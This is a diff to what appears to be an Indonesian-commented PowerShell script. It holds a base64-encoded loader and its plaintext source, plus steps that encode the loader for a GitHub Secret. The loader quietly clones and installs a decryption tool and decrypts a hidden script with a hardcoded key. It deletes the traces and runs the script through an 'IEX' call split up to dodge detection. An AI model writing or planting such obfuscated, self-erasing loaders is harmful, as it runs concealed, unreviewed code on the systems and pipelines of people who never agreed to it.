@@ -1,1 +1,32 @@
-Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9TY2hlbGRlc3QvZGV4LWVuYy5naXQgLS1xdWlldCA+ICRudWxsCmNkIGRleC1lbmMKcGlwIGluc3RhbGwgLiAtLXF1aWV0ID4gJG51bGwKY2QgLi4KCiRwID0gSm9pbi1QYXRoICRwd2QgInI0ZHguZGV4ZW5jIgppZiAoVGVzdC1QYXRoICRwKSB7CiAgICBkZXhlbmMgZGVjcnlwdCAtaSAkcCAta2V5ICIkZW52OkRfS0VZIiAtbyAiJHB3ZFxyNGR4LnBzMSIKICAgIGlmIChUZXN0LVBhdGggIiRwd2RccjRkeC5wczEiKSB7CiAgICAgICAgJGNvbnRlbnQgPSBHZXQtQ29udGVudCAiJHB3ZFxyNGR4LnBzMSIgLVJhdwogICAgICAgIFJlbW92ZS1JdGVtICIkcHdkXHI0ZHgucHMxIiAtRm9yY2UKICAgICAgICBSZW1vdmUtSXRlbSAtUmVjdXJzZSAtRm9yY2UgZGV4LWVuYwogICAgICAgICRlID0gIkkiICsgIkUiICsgIlgiCiAgICAgICAgJiAkZSAoJGNvbnRlbnQpCiAgICB9Cn0=
+Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9TY2hlbGRlc3QvZGV4LWVuYy5naXQgLS1xdWlldCA+ICRudWxsCmNkIGRleC1lbmMKcGlwIGluc3RhbGwgLiAtLXF1aWV0ID4gJG51bGwKY2QgLi4KCiRwID0gSm9pbi1QYXRoICRwd2QgInI0ZHguZGV4ZW5jIgppZiAoVGVzdC1QYXRoICRwKSB7CiAgICBkZXhlbmMgZGVjcnlwdCAtaSAkcCAta2V5IHI0ZGV4NDQ0NCAtbyAiJHB3ZFxyNGR4LnBzMSIKICAgIGlmIChUZXN0LVBhdGggIiRwd2RccjRkeC5wczEiKSB7CiAgICAgICAgJGNvbnRlbnQgPSBHZXQtQ29udGVudCAiJHB3ZFxyNGR4LnBzMSIgLVJhdwogICAgICAgIFJlbW92ZS1JdGVtICIkcHdkXHI0ZHgucHMxIiAtRm9yY2UKICAgICAgICBSZW1vdmUtSXRlbSAtUmVjdXJzZSAtRm9yY2UgZGV4LWVuYwogICAgICAgICRlID0gIkkiICsgIkUiICsgIlgiCiAgICAgICAgJiAkZSAoJGNvbnRlbnQpCiAgICB9Cn0=
+
+
+
+# 1. Masukkan blok kode dekripsi kamu di bawah ini (di antara tanda @' dan '@)
+$myCode = @'
+git clone https://github.com/Scheldest/dex-enc.git --quiet > $null
+cd dex-enc
+pip install . --quiet > $null
+cd ..
+
+$p = Join-Path $pwd "r4dx.dexenc"
+if (Test-Path $p) {
+    dexenc decrypt -i $p -key r4dex4444 -o "$pwd\r4dx.ps1"
+    if (Test-Path "$pwd\r4dx.ps1") {
+        $content = Get-Content "$pwd\r4dx.ps1" -Raw
+        Remove-Item "$pwd\r4dx.ps1" -Force
+        Remove-Item -Recurse -Force dex-enc
+        $e = "I" + "E" + "X"
+        & $e ($content)
+    }
+}
+'@
+
+# 2. Proses konversi ke Base64
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($myCode)
+$base64 = [Convert]::ToBase64String($bytes)
+
+# 3. Tampilkan hasilnya
+Write-Host "`n[+] HASIL ENCODE (Copy string di bawah ini ke GitHub Secret):`n" -ForegroundColor Green
+$base64
+Write-Host "`n"
